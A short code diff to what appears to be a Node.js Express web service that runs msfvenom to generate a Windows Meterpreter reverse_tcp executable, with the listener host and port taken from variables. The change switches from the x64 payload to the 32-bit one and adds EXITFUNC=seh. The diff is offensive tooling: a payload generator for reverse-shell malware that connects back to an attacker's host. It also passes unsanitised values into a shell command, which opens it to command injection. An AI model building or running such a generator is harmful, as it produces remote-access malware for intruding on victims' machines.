@@ -14,7 +14,7 @@ app.get('/temp',(req,res)=>{
     console.log("Generating payload...");
 
     // 1. Generate the payload
-    exec(`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o ${outputPath}`, (err) => {
+    exec(`msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} EXITFUNC=seh -f exe -o ${outputPath}`, (err) => {
         if (err) {
             return res.status(500).send("Error in the Backend");
         }
